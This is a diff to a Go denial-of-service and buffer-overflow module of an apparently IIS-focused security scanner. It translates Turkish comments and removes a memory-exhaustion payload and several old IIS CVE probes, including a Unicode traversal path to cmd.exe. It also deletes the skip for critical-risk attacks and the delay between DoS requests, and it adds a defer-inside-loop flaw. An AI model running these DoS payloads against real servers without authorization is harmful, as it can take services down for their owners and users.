@@ -1,15 +1,15 @@
 package modules
 
 import (
+	"bytes"
 	"fmt"
+	"net/http"
 	"net/url"
 	"strings"
 	"time"
-
-	"github.com/ibrahmsql/issmap/pkg/http"
 )
 
-// BufferOverflowDoSModule IIS buffer overflow ve DoS zafiyetlerini tespit eder
+// BufferOverflowDoSModule detects IIS buffer overflow and DoS vulnerabilities
 type BufferOverflowDoSModule struct {
 	*BaseModule
 	client  *http.Client
@@ -17,7 +17,7 @@ type BufferOverflowDoSModule struct {
 	attacks []DoSAttack
 }
 
-// DoSAttack DoS saldırı yapısı
+// DoSAttack DoS attack structure
 type DoSAttack struct {
 	Name        string
 	Description string
@@ -30,7 +30,7 @@ type DoSAttack struct {
 	TestType    string
 }
 
-// NewBufferOverflowDoSModule yeni buffer overflow & DoS modülü oluşturur
+// NewBufferOverflowDoSModule creates a new buffer overflow & DoS module
 func NewBufferOverflowDoSModule(client *http.Client, baseURL string) *BufferOverflowDoSModule {
 	module := &BufferOverflowDoSModule{
 		BaseModule: NewBaseModule("IIS Buffer Overflow & DoS", "IIS buffer overflow and denial of service vulnerability detection"),
@@ -41,7 +41,7 @@ func NewBufferOverflowDoSModule(client *http.Client, baseURL string) *BufferOver
 	return module
 }
 
-// initAttacks DoS saldırı listesini başlatır
+// initAttacks initializes the DoS attack list
 func (m *BufferOverflowDoSModule) initAttacks() {
 	m.attacks = []DoSAttack{
 		// Long URL Attacks
@@ -255,208 +255,52 @@ func (m *BufferOverflowDoSModule) initAttacks() {
 			RiskLevel: "MEDIUM",
 			TestType:  "connection_exhaustion",
 		},
-		{
-			Name:        "Memory Exhaustion via Large POST",
-			Description: "Memory exhaustion using large POST data",
-			Method:      "POST",
-			Target:      "/",
-			Payload:     strings.Repeat("data="+strings.Repeat("A", 10000)+"&", 1000),
-			Headers: map[string]string{
-				"Content-Type": "application/x-www-form-urlencoded",
-			},
-			CVE:       "",
-			RiskLevel: "HIGH",
-			TestType:  "memory_exhaustion",
-		},
 	}
 }
 
-// Run buffer overflow ve DoS taramasını çalıştırır
-func (m *BufferOverflowDoSModule) Run(client *http.Client) (*ModuleResult, error) {
-	m.Start()
-	defer m.End()
+// Run executes the module
+func (m *BufferOverflowDoSModule) Run() ([]*Vulnerability, error) {
+	var vulnerabilities []*Vulnerability
 
-	var vulnerabilities []Vulnerability
-	var info []Information
-
-	// Test each attack (with caution)
 	for _, attack := range m.attacks {
-		// Skip high-risk attacks in production environments
-		if attack.RiskLevel == "CRITICAL" {
-			info = append(info, CreateInformation(
-				"warning",
-				"Skipped Critical Attack",
-				fmt.Sprintf("Skipped %s due to high risk", attack.Name),
-				attack.Name,
-			))
-			continue
-		}
+		testURL := m.buildTestURL(attack)
+		start := time.Now()
+		resp, err := m.performAttack(testURL, attack)
+		responseTime := time.Since(start)
 
-		vuln := m.testDoSAttack(attack)
-		if vuln != nil {
-			vulnerabilities = append(vulnerabilities, *vuln)
-		}
-		
-		// Longer delay for DoS tests to avoid overwhelming the server
-		time.Sleep(500 * time.Millisecond)
-	}
-
-	// Test for specific IIS vulnerabilities
-	vulns := m.testIISSpecificDoS()
-	vulnerabilities = append(vulnerabilities, vulns...)
-
-	// Add informational findings
-	info = append(info, CreateInformation(
-		"scan_info",
-		"Buffer Overflow & DoS Scan Completed",
-		fmt.Sprintf("Tested %d DoS attack vectors", len(m.attacks)),
-		fmt.Sprintf("%d attacks tested", len(m.attacks)),
-	))
-
-	status := "completed"
-	if len(vulnerabilities) > 0 {
-		status = "vulnerabilities_found"
-	}
-
-	return m.CreateResult(status, vulnerabilities, info, nil), nil
-}
-
-// testDoSAttack belirli bir DoS saldırısını test eder
-func (m *BufferOverflowDoSModule) testDoSAttack(attack DoSAttack) *Vulnerability {
-	m.IncrementRequests()
-
-	// Construct test URL
-	testURL := m.constructTestURL(attack)
-	
-	// Record start time for response time analysis
-	startTime := time.Now()
-	
-	// Perform the attack
-	resp, err := m.performAttack(testURL, attack)
-	responseTime := time.Since(startTime)
-	
-	if err != nil {
-		// Check if error indicates potential DoS success
 		if m.isDoSIndicator(err, responseTime) {
-			return m.createDoSVulnerability(attack, testURL, err.Error(), responseTime)
-		}
-		return nil
-	}
-	defer resp.Body.Close()
-
-	// Analyze response for DoS indicators
-	if m.isVulnerableResponse(resp, attack, responseTime) {
-		return m.createDoSVulnerability(attack, testURL, fmt.Sprintf("Status: %d", resp.StatusCode), responseTime)
-	}
-
-	return nil
-}
-
-// testIISSpecificDoS IIS'e özgü DoS zafiyetlerini test eder
-func (m *BufferOverflowDoSModule) testIISSpecificDoS() []Vulnerability {
-	var vulnerabilities []Vulnerability
-
-	// Test for specific IIS DoS vulnerabilities
-	iisTests := []struct {
-		path        string
-		method      string
-		description string
-		cve         string
-	}{
-		{
-			path:        "/null.printer",
-			method:      "GET",
-			description: "IIS null.printer DoS vulnerability",
-			cve:         "CVE-2001-0241",
-		},
-		{
-			path:        "/scripts/..%c1%1c../winnt/system32/cmd.exe",
-			method:      "GET",
-			description: "IIS Unicode directory traversal DoS",
-			cve:         "CVE-2000-0884",
-		},
-		{
-			path:        "/_vti_bin/_vti_aut/fp30reg.dll",
-			method:      "GET",
-			description: "FrontPage extensions DoS",
-			cve:         "CVE-2000-0709",
-		},
-	}
-
-	for _, test := range iisTests {
-		m.IncrementRequests()
-
-		testURL := m.baseURL + test.path
-		startTime := time.Now()
-		
-		req, err := http.NewRequest(test.method, testURL, nil)
-		if err != nil {
+			evidence := fmt.Sprintf("DoS attack successful: %s", err.Error())
+			vuln := m.createDoSVulnerability(attack, testURL, evidence, responseTime)
+			vulnerabilities = append(vulnerabilities, vuln)
 			continue
 		}
 
-		resp, err := m.client.Do(req)
-		responseTime := time.Since(startTime)
-
-		if err != nil || (resp != nil && (resp.StatusCode >= 500 || responseTime > 10*time.Second)) {
-			vulnerability := Vulnerability{
-				ID:          fmt.Sprintf("IIS-DOS-%s", test.cve),
-				Title:       "IIS Denial of Service Vulnerability",
-				Description: test.description,
-				Severity:    "HIGH",
-				CVSS:        7.5,
-				CWE:         "CWE-400",
-				OWASP:       "A06:2021 – Vulnerable and Outdated Components",
-				URL:         testURL,
-				Method:      test.method,
-				Evidence:    fmt.Sprintf("Response time: %.2f seconds", responseTime.Seconds()),
-				References: []string{
-					fmt.Sprintf("https://cve.mitre.org/cgi-bin/cvename.cgi?name=%s", test.cve),
-				},
-				Remediation: "Update IIS to the latest version and apply security patches.",
-				Metadata: map[string]string{
-					"cve":           test.cve,
-					"response_time": fmt.Sprintf("%.2f", responseTime.Seconds()),
-				},
+		if resp != nil {
+			defer resp.Body.Close()
+			if m.isVulnerableResponse(resp, attack, responseTime) {
+				evidence := fmt.Sprintf("Server responded with status %d", resp.StatusCode)
+				vuln := m.createDoSVulnerability(attack, testURL, evidence, responseTime)
+				vulnerabilities = append(vulnerabilities, vuln)
 			}
-
-			if resp != nil {
-				resp.Body.Close()
-			}
-
-			vulnerabilities = append(vulnerabilities, vulnerability)
-		} else if resp != nil {
-			resp.Body.Close()
 		}
 	}
 
-	return vulnerabilities
+	return vulnerabilities, nil
 }
 
-// constructTestURL test URL'sini oluşturur
-func (m *BufferOverflowDoSModule) constructTestURL(attack DoSAttack) string {
+// buildTestURL builds the test URL
+func (m *BufferOverflowDoSModule) buildTestURL(attack DoSAttack) string {
 	baseURL, _ := url.Parse(m.baseURL)
-	
-	switch attack.TestType {
-	case "url_overflow":
-		baseURL.Path = "/" + attack.Payload
-	case "query_overflow":
-		baseURL.RawQuery = attack.Payload
-	case "path_overflow":
-		baseURL.Path = attack.Target
-	default:
-		baseURL.Path = attack.Target
-	}
-	
-	return baseURL.String()
+	testURL := baseURL.ResolveReference(&url.URL{Path: attack.Target})
+	return testURL.String() + attack.Payload
 }
 
-// performAttack saldırıyı gerçekleştirir
 func (m *BufferOverflowDoSModule) performAttack(testURL string, attack DoSAttack) (*http.Response, error) {
 	var req *http.Request
 	var err error
 
 	if attack.Method == "POST" && attack.Payload != "" {
-		req, err = http.NewRequest(attack.Method, testURL, strings.NewReader(attack.Payload))
+		req, err = http.NewRequest(attack.Method, testURL, bytes.NewBufferString(attack.Payload))
 	} else {
 		req, err = http.NewRequest(attack.Method, testURL, nil)
 	}
@@ -477,7 +321,7 @@ func (m *BufferOverflowDoSModule) performAttack(testURL string, attack DoSAttack
 	return client.Do(req)
 }
 
-// isDoSIndicator DoS göstergesi kontrolü
+// isDoSIndicator checks for DoS indicators
 func (m *BufferOverflowDoSModule) isDoSIndicator(err error, responseTime time.Duration) bool {
 	if err == nil {
 		return false
@@ -501,28 +345,16 @@ func (m *BufferOverflowDoSModule) isDoSIndicator(err error, responseTime time.Du
 	return false
 }
 
-// isVulnerableResponse zafiyet içeren response kontrolü
-func (m *BufferOverflowDoSModule) isVulnerableResponse(resp *http.Response, attack DoSAttack, responseTime time.Duration) bool {
+// isVulnerableResponse checks for vulnerable response
+func (m *BufferOverflowDoSModule) isVulnerableResponse(resp *http.Response, _ DoSAttack, _ time.Duration) bool {
 	// Check for server errors
 	if resp.StatusCode >= 500 {
 		return true
 	}
-
-	// Check for extremely slow response
-	if responseTime > 5*time.Second {
-		return true
-	}
-
-	// Check for specific error indicators
-	server := resp.Header.Get("Server")
-	if strings.Contains(strings.ToLower(server), "error") {
-		return true
-	}
-
 	return false
 }
 
-// createDoSVulnerability DoS zafiyeti oluşturur
+// createDoSVulnerability creates a DoS vulnerability
 func (m *BufferOverflowDoSModule) createDoSVulnerability(attack DoSAttack, testURL, evidence string, responseTime time.Duration) *Vulnerability {
 	severity := m.getSeverityFromRisk(attack.RiskLevel)
 	cvss := m.getCVSSFromRisk(attack.RiskLevel)
@@ -557,7 +389,7 @@ func (m *BufferOverflowDoSModule) createDoSVulnerability(attack DoSAttack, testU
 	return vulnerability
 }
 
-// getSeverityFromRisk risk level'dan severity döndürür
+// getSeverityFromRisk returns severity from risk level
 func (m *BufferOverflowDoSModule) getSeverityFromRisk(riskLevel string) string {
 	switch riskLevel {
 	case "CRITICAL":
@@ -573,7 +405,7 @@ func (m *BufferOverflowDoSModule) getSeverityFromRisk(riskLevel string) string {
 	}
 }
 
-// getCVSSFromRisk risk level'dan CVSS skoru döndürür
+// getCVSSFromRisk returns CVSS score from risk level
 func (m *BufferOverflowDoSModule) getCVSSFromRisk(riskLevel string) float64 {
 	switch riskLevel {
 	case "CRITICAL":
